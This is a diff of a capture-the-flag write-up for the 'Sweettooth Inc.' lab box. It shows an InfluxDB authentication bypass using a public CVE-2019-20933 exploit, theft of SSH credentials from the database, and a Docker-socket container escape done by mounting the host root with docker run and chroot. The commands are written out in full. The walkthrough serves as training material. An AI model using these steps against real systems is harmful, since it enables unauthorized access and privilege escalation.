@@ -8,6 +8,8 @@ toc: true
 
 > Sweettooth Inc. needs your help to find out how secure their system is!
 
+
+
 As with all boxes, we start with an nmap scan.
 
 ## Nmap
@@ -50,10 +52,9 @@ When going to the webpage we see this:
 
 ![](/assets/img/2021-07-28-08-40-57.png)
 
-From the nmap scan, we know this in InfluxDB version 1.3. Let's look at the HTTP API documentation for it:
+From the nmap scan, we know this in InfluxDB version 1.3. Let's look at the documentation for this (as there is an HTTP server running):
 
 https://docs.influxdata.com/influxdb/v1.3/tools/api/
-
 
 There are a few endpoints:
 
@@ -63,16 +64,16 @@ Visiting ``/debug/requests`` leaks what appears to be a username making queries.
 
 We get the username ``o5yY6yya``.
 
-``/query`` and ``/write`` both require authentication, and we a password for the username we have.
+``/query`` and ``/write`` both require authentication, and we only have a username.
 
-Researching vulnerabilities for InfluxDB, we find a vulnerability where we can bypass authentication if we have the username of a user - CVE-2019-20933.
+Researching vulnerabilities for InfluxDB, we find a vulnerability where we can bypass authentication given we know a username - CVE-2019-20933.
 
 
 ## CVE-2019-20933
 
 A quick google search leads us to some exploit code on Github: https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
 
-Looking at the code, it appears to bruteforce usernames given a wordlist, then drops into a scuffed shell to interact with the db.
+Looking at the code, it appears to bruteforce usernames given a wordlist, then drops into a scuffed "shell" to interact with the db.
 
 Let's run the exploit:
 
@@ -136,9 +137,7 @@ Insert database name (exit to close): creds
 
 ```
 
-Ok, so it looks like there are two values, a user and something related to ssh.
-
-show field keys from "ssh"
+Ok, so it looks like there are two values, a username and something related to ssh.
 
 I'm thinking of ssh like a table. Let's look at the keys/columns:
 
@@ -168,7 +167,7 @@ I'm thinking of ssh like a table. Let's look at the keys/columns:
 }
 ```
 
-Ok nice, there is a password. Let's select it:
+Ok nice, there is a password. Let's grab it:
 
 ```
 [creds] Insert query (exit to change db): select pw from ssh
@@ -200,11 +199,9 @@ And we get creds we can SSH with:
 
 ``uzJk6Ry98d8C:REDACTED``
 
-7788764472
-
 ## Getting User
 
-Remember SSH is on port 2222:
+Remember SSH is listening on port 2222:
 
 ```
 kali@kali:~/Desktop/thm/sweettoothinc/InfluxDB-Exploit-CVE-2019-20933$ ssh -p 2222 uzJk6Ry98d8C@10.10.114.8
@@ -231,7 +228,7 @@ uzJk6Ry98d8C@575d68b41bfa:~$
 
 ## PrivEsc
 
-I transferred linpeas to the machine using python3's http.server:
+I transferred linpeas to the machine using python3's http.server module:
 
 My Machine:
 
@@ -282,27 +279,15 @@ We are in a Docker container and we can write to the Docker socket:
 You have write permissions over Docker socket /run/docker.sock
 ```
 
-We have some capabilities:
 
-```
-╔══════════╣ Capabilities
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities                                       
-Current capabilities:                                                                                            
-Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+i
-CapInh: 0000003fffffffff
-CapPrm: 0000000000000000
-CapEff: 0000000000000000
-CapBnd: 0000003fffffffff
-```
-
-As the challenge asks for two different root flags and we know that we are inside a container, it is clear that we should exploit that something that will allow us to escape, so I decide to use the docker socket.
+As the challenge asks for two different root flags and we know that we are inside a container, it is clear that we should exploit that something that will allow us to escape/read the host file system, so I decide to use the fact that I can write to the docker socket over the ability to utilize kernel exploit.
 
 There are some one-liner commands that would allow us to mount the filesystem of a container we spin up, however there are two problems with these:
 
-1: We don't have access to the docker binary
-2: The version of curl installed is so old that we cannot use ``--unix-socket`` to communicate with the socket.
+1: We don't have access to the docker binary so we cannot communicate directly. 
+2: The best alternative we have is curl, however the version of curl installed is so old that we cannot use ``--unix-socket`` to communicate with the socket.
 
-Because of this, I opted to go with another option: forward the docker socket over SSH.
+Because of this, I opted to go with another option: forward the docker socket over SSH. This would allow me to use my local docker binaries/locally installed curl.
 
 I found this blog post detailing how to do this: https://blog.ruanbekker.com/blog/2018/04/30/forwarding-the-docker-socket-via-a-ssh-tunnel-to-execute-docker-commands-locally/
 
@@ -310,7 +295,7 @@ I found this blog post detailing how to do this: https://blog.ruanbekker.com/blo
 The following commands are done on my machine:
 
 
-I modified the command a little bit to fit my needs:
+I modified the command given in the linked article a little bit to fit my needs:
 
 ```
 ssh -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -NL localhost:2377:/var/run/docker.sock -p 2222 uzJk6Ry98d8C@10.10.114.8
@@ -379,7 +364,7 @@ sweettoothinc   latest    26a697c0d00f   2 months ago   359MB
 influxdb        1.3.0     e1b5eda429c3   4 years ago    227MB
 ```
 
-We can spin up another ``sweettoothinc`` image!
+We can spin up another ``sweettoothinc`` image, which we know is an older version of Debian (which is fine for what we need).
 
 Let's do this:
 
@@ -387,7 +372,7 @@ Let's do this:
 docker run -v /:/mnt --rm -it sweettoothinc chroot /mnt sh
 ```
 
-It starts but I'm not dropped into a shell, I'm dropped into some kind of logging thing. Opening up another terminal, I tell the docker binary to point to the forwarded socket and get a shell on the container we just started:
+It starts but I'm not dropped into a shell, I'm dropped into some kind of logging output. Opening up another terminal on my host machine, I set the environment variable again to tell the docker binary to point to the forwarded socket and get a shell on the container we just started:
 
 ```
 kali@kali:~$ docker ps
